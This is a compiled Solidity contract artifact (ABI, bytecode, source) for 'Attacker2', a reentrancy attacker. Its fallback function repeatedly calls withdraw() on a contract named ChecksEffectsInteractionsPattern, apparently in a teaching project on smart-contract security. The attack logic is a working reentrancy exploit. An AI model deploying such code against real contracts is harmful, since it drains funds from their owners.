{
  "contractName": "Attacker2",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract ChecksEffectsInteractionsPattern",
          "name": "victim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "c",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "balance",
          "type": "uint256"
        }
      ],
      "name": "LogFallback",
      "type": "event"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516102a33803806102a38339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061020f806100946000396000f3fe60806040526004361061002d5760003560e01c806306661abd1461010f5780639e5faafc1461013a5761002e565b5b6001600081548092919060010191905055507ff4159b37750c1f8102b811a1409a82c505fbd359fd52574d3523feca952764f160015447604051808381526020018281526020019250505060405180910390a1600a600154101561010d5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100f457600080fd5b505af1158015610108573d6000803e3d6000fd5b505050505b005b34801561011b57600080fd5b50610124610151565b6040518082815260200191505060405180910390f35b34801561014657600080fd5b5061014f610157565b005b60015481565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101bf57600080fd5b505af11580156101d3573d6000803e3d6000fd5b5050505056fea2646970667358221220ae29f08679b63b0c5263e30555578373886388f59c5132338246ccd75a89f5b964736f6c63430007000033",
  "immutableReferences": {},
  "source": "pragma solidity ^0.7.0;\n\nimport './ChecksEffectsInteractionsPattern.sol';\n\ncontract Attacker2 {\n  ChecksEffectsInteractionsPattern v;\n  uint256 public count;\n\n\n  event LogFallback(uint c, uint balance);\n\n  constructor (ChecksEffectsInteractionsPattern victim) {\n    v = ChecksEffectsInteractionsPattern(victim);\n  }\n\n  function attack() public {\n    v.withdraw();\n  }\n\n  fallback() external payable {\n    count++;\n\n    emit LogFallback(count, address(this).balance);\n    if (count < 10) {\n      v.withdraw();\n    } \n  }\n}",
  "sourcePath": "/home/niklas/Documents/HIWI AIFB/smart-contract-dev-support/contracts/attacker2.sol",
  "compiler": {
    "name": "solc",
    "version": "0.7.0+commit.9e61f92b.Emscripten.clang"
  },
  "schemaVersion": "3.4.0",
  "updatedAt": "2021-05-08T17:02:04.261Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}